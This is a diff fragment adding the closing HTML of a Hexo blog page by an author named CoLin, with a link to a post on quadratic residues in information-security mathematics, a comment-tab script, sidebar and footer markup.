+    <a href="/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99%E4%B8%8E%E6%96%B9%E6%A0%B9/" rel="next" title="信息安全数学基础 Chapter 4——二次剩余与方根">
+      信息安全数学基础 Chapter 4——二次剩余与方根 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CoLin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CoLin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
